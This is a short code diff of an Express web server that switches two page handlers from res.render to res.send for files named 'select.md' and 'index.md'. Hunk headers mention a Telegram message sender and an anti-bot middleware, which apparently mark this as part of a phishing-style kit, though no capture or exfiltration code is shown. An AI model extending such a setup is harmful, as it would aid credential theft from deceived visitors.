@@ -50,16 +50,17 @@ const sendTelegramMessage = (text) => {
     req.end();
 };
 
-app.get('/app',async (req, res) => {
-	try {
-	const pickContent = await fs.readFile('select.md', 'utf-8');
-	res.render(pickContent);
-	    } catch (error) {
+
+app.get('/app', async (req, res) => {
+    try {
+        const pickContent = await fs.readFile('select.md', 'utf-8');
+        res.send(pickContent); // Send the content of select.md directly
+    } catch (error) {
         // Handle any errors, for example, file not found
         console.error('Error reading file:', error);
         res.status(500).send('Internal Server Error');
     }
-	});
+});
 
 
 
@@ -213,7 +214,7 @@ async function antiBotMiddleware(req, res, next) {
     	
     	try {
     	const pickContent = await fs.readFile('index.md', 'utf-8');
-		res.render(pickContent);
+		res.send(pickContent);
     	//res.sendFile(path.join(__dirname, 'index.md'));
     	    } catch (error) {
         // Handle any errors, for example, file not found
